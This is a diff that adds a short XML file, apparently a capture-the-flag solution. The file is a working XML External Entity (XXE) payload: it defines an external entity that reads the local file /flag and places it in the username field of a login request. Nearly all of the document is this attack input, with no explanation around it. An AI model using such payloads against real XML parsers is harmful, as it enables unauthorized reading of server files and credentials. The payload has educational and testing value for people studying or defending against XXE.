@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE a [
+ <!ENTITY exp SYSTEM "file:///flag">
+ ]>
+<user><username>&exp;</username><password>aaaa</password></user>
